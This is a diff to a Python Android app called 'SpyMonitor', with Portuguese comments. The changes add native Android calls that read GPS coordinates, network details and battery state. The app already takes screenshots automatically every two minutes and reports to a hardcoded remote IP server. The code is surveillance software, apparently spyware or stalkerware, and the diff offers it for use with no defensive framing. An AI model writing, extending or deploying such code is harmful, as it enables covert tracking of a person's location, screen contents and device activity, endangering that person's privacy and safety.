@@ -12,6 +12,13 @@ import tempfile
 import logging
 import queue
 
+# Verificar disponibilidade do rubicon-java
+try:
+    import rubicon.java
+    RUBICON_AVAILABLE = True
+except ImportError:
+    RUBICON_AVAILABLE = False
+
 # Configurações otimizadas
 SERVER_URL = "https://147.79.111.118"
 COLLECTION_INTERVAL = 120  # 2 minutos
@@ -36,7 +43,11 @@ class SpyMonitor(toga.App):
             self.last_screenshot = 0
             self.send_thread = None
 
-            # Interface principal
+            # Inicializar APIs nativas do Android (apenas se disponível)
+            if RUBICON_AVAILABLE and platform.system() == 'Android':
+                self.init_android_apis()
+
+            # Interface principal simplificada
             main_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
 
             # Título
@@ -68,9 +79,17 @@ class SpyMonitor(toga.App):
             )
             main_box.add(self.monitor_button)
 
+            # Botão de teste de conexão
+            self.test_button = toga.Button(
+                "🔍 Testar Conexão",
+                on_press=self.test_connection_manual,
+                style=Pack(padding=(5, 0))
+            )
+            main_box.add(self.test_button)
+
             # Logs simples
             self.log_label = toga.Label(
-                "Logs: Pronto",
+                "📝 Logs: Pronto",
                 style=Pack(padding=(10, 5, 0, 5), font_size=12)
             )
             main_box.add(self.log_label)
@@ -83,7 +102,7 @@ class SpyMonitor(toga.App):
             self.update_log("App inicializado")
 
         except Exception as e:
-            # Interface de erro
+            # Interface de erro simplificada
             error_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
             error_label = toga.Label(f"Erro: {str(e)[:50]}", style=Pack(padding=(0, 5)))
             error_box.add(error_label)
@@ -91,6 +110,21 @@ class SpyMonitor(toga.App):
             self.main_window = toga.MainWindow(title="Erro")
             self.main_window.content = error_box
             self.main_window.show()
+
+    def init_android_apis(self):
+        """Inicializa APIs nativas do Android usando rubicon-java"""
+        try:
+            from rubicon.java import JavaClass
+
+            # Inicializar classes Android
+            self.Intent = JavaClass('android/content/Intent')
+            self.IntentFilter = JavaClass('android/content/IntentFilter')
+            self.BatteryManager = JavaClass('android/os/BatteryManager')
+            self.LocationManager = JavaClass('android/location/LocationManager')
+
+            self.update_log("APIs Android inicializadas")
+        except Exception as e:
+            self.update_log(f"Erro APIs Android: {str(e)[:20]}")
 
     def get_device_id(self):
         try:
@@ -108,6 +142,15 @@ class SpyMonitor(toga.App):
         except:
             pass
 
+    def restart_app(self, widget):
+        """Reinicia o aplicativo"""
+        try:
+            self.main_window.close()
+            app = SpyMonitor()
+            app.main_loop()
+        except:
+            pass
+
     def toggle_monitoring(self, widget):
         if not self.is_monitoring:
             self.start_monitoring()
@@ -117,32 +160,36 @@ class SpyMonitor(toga.App):
     def start_monitoring(self):
         try:
             self.is_monitoring = True
-            self.status_label.text = "Status: Ativo"
+            self.status_label.text = "▶️ Ativo"
+            self.status_label.style.color = '#27ae60'
             self.monitor_button.text = "⏹️ Parar Monitoramento"
+            self.monitor_button.style.background_color = '#e74c3c'
 
             # Testar conexão
             if self.test_connection():
-                self.update_log("Conectado ao servidor")
+                self.update_log("🌐 Conectado ao servidor")
 
                 # Iniciar monitoramento em thread
                 self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
                 self.monitoring_thread.start()
 
-                self.update_log("Monitoramento iniciado - Captura automática de screenshots ativada")
+                self.update_log("🚀 Monitoramento iniciado - Captura automática ativada")
             else:
-                self.update_log("Erro: Servidor indisponível")
+                self.update_log("❌ Erro: Servidor indisponível")
                 self.stop_monitoring()
 
         except Exception as e:
-            self.update_log(f"Erro ao iniciar: {str(e)[:30]}")
+            self.update_log(f"❌ Erro ao iniciar: {str(e)[:30]}")
             self.stop_monitoring()
 
     def stop_monitoring(self):
         try:
             self.is_monitoring = False
-            self.status_label.text = "Status: Parado"
+            self.status_label.text = "⏹️ Parado"
+            self.status_label.style.color = '#e74c3c'
             self.monitor_button.text = "▶️ Iniciar Monitoramento"
-            self.update_log("Monitoramento parado")
+            self.monitor_button.style.background_color = '#27ae60'
+            self.update_log("⏹️ Monitoramento parado")
         except:
             pass
 
@@ -152,6 +199,17 @@ class SpyMonitor(toga.App):
             return response.status_code == 200
         except:
             return False
+
+    def test_connection_manual(self, widget):
+        """Teste manual de conexão"""
+        try:
+            self.update_log("🔍 Testando conexão com servidor...")
+            if self.test_connection():
+                self.update_log("✅ Conexão OK - Servidor respondendo")
+            else:
+                self.update_log("❌ Falha na conexão - Verifique internet")
+        except Exception as e:
+            self.update_log(f"❌ Erro no teste: {str(e)[:30]}")
 
     def monitoring_loop(self):
         """Loop principal de monitoramento otimizado"""
@@ -220,9 +278,33 @@ class SpyMonitor(toga.App):
             self.update_log(f"❌ Erro na coleta: {str(e)[:25]}")
 
     def get_location(self):
-        """Obtém localização do dispositivo"""
+        """Obtém localização do dispositivo usando rubicon-java"""
         try:
-            if platform.system() == 'Android':
+            if RUBICON_AVAILABLE and platform.system() == 'Android' and hasattr(self, 'LocationManager'):
+                from toga_android import app as toga_app
+                context = toga_app.context
+
+                # Verificar permissão de localização
+                if not self.check_location_permission():
+                    self.update_log("Sem permissão GPS")
+                    return None
+
+                # Obter LocationManager
+                location_manager = context.getSystemService(context.LOCATION_SERVICE)
+
+                # Tentar obter última localização conhecida
+                location = location_manager.getLastKnownLocation(location_manager.GPS_PROVIDER)
+
+                if location:
+                    return {
+                        'latitude': location.getLatitude(),
+                        'longitude': location.getLongitude(),
+                        'accuracy': location.getAccuracy(),
+                        'timestamp': datetime.datetime.now().isoformat()
+                    }
+
+            # Fallback para plyer
+            elif platform.system() == 'Android':
                 from plyer import gps
 
                 # Configurar GPS
@@ -238,7 +320,7 @@ class SpyMonitor(toga.App):
 
             return None
         except Exception as e:
-            self.update_log(f"Erro no GPS: {str(e)[:20]}")
+            self.update_log(f"Erro GPS: {str(e)[:20]}")
             return None
 
     def on_location_update(self, **kwargs):
@@ -251,34 +333,111 @@ class SpyMonitor(toga.App):
         }
 
     def get_network_info(self):
-        """Obtém informações de rede"""
+        """Obtém informações de rede usando rubicon-java"""
         try:
-            import socket
-            hostname = socket.gethostname()
-            local_ip = socket.gethostbyname(hostname)
+            if RUBICON_AVAILABLE and platform.system() == 'Android':
+                from toga_android import app as toga_app
+                context = toga_app.context
 
-            return {
-                'hostname': hostname,
-                'local_ip': local_ip,
-                'timestamp': datetime.datetime.now().isoformat()
-            }
-        except:
+                # Obter informações de conectividade
+                connectivity_manager = context.getSystemService(context.CONNECTIVITY_SERVICE)
+                network_info = connectivity_manager.getActiveNetworkInfo()
+
+                network_data = {
+                    'hostname': 'Android Device',
+                    'local_ip': 'Unknown',
+                    'network_type': 'Unknown',
+                    'is_connected': False,
+                    'timestamp': datetime.datetime.now().isoformat()
+                }
+
+                if network_info:
+                    network_data['is_connected'] = network_info.isConnected()
+                    network_data['network_type'] = network_info.getTypeName()
+
+                    # Tentar obter IP local
+                    try:
+                        import socket
+                        hostname = socket.gethostname()
+                        local_ip = socket.gethostbyname(hostname)
+                        network_data['hostname'] = hostname
+                        network_data['local_ip'] = local_ip
+                    except:
+                        pass
+
+                return network_data
+
+            # Fallback para socket
+            else:
+                import socket
+                hostname = socket.gethostname()
+                local_ip = socket.gethostbyname(hostname)
+
+                return {
+                    'hostname': hostname,
+                    'local_ip': local_ip,
+                    'network_type': 'Unknown',
+                    'is_connected': True,
+                    'timestamp': datetime.datetime.now().isoformat()
+                }
+        except Exception as e:
+            self.update_log(f"Erro rede: {str(e)[:20]}")
             return None
 
-    def get_battery_info(self):
-        """Obtém informações da bateria (Android)"""
+    def check_location_permission(self):
+        """Verifica se tem permissão de localização"""
         try:
-            if platform.system() == 'Android':
-                from plyer import battery
+            from toga_android import app as toga_app
+            context = toga_app.context
 
+            permission = context.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION")
+            return permission == context.PERMISSION_GRANTED
+        except:
+            return False
+
+    def get_battery_info(self):
+        """Obtém informações da bateria usando rubicon-java"""
+        try:
+            if RUBICON_AVAILABLE and platform.system() == 'Android' and hasattr(self, 'BatteryManager'):
+                from toga_android import app as toga_app
+                context = toga_app.context
+
+                # Criar intent para bateria
+                intent_filter = self.IntentFilter(self.Intent.ACTION_BATTERY_CHANGED)
+                battery_intent = context.registerReceiver(None, intent_filter)
+
+                if battery_intent:
+                    # Obter nível da bateria
+                    level = battery_intent.getIntExtra(self.BatteryManager.EXTRA_LEVEL, -1)
+                    scale = battery_intent.getIntExtra(self.BatteryManager.EXTRA_SCALE, -1)
+
+                    if level >= 0 and scale > 0:
+                        battery_level = (level / scale) * 100
+
+                        # Verificar se está carregando
+                        status = battery_intent.getIntExtra(self.BatteryManager.EXTRA_STATUS, -1)
+                        is_charging = status == self.BatteryManager.BATTERY_STATUS_CHARGING or \
+                                    status == self.BatteryManager.BATTERY_STATUS_FULL
+
+                        return {
+                            'level': int(battery_level),
+                            'charging': is_charging,
+                            'timestamp': datetime.datetime.now().isoformat()
+                        }
+
+            # Fallback para plyer
+            elif platform.system() == 'Android':
+                from plyer import battery
                 battery_status = battery.status
                 return {
                     'level': battery_status.get('percentage', 0),
                     'charging': battery_status.get('isCharging', False),
                     'timestamp': datetime.datetime.now().isoformat()
                 }
+
             return None
-        except:
+        except Exception as e:
+            self.update_log(f"Erro bateria: {str(e)[:20]}")
             return None
 
     def take_screenshot(self):
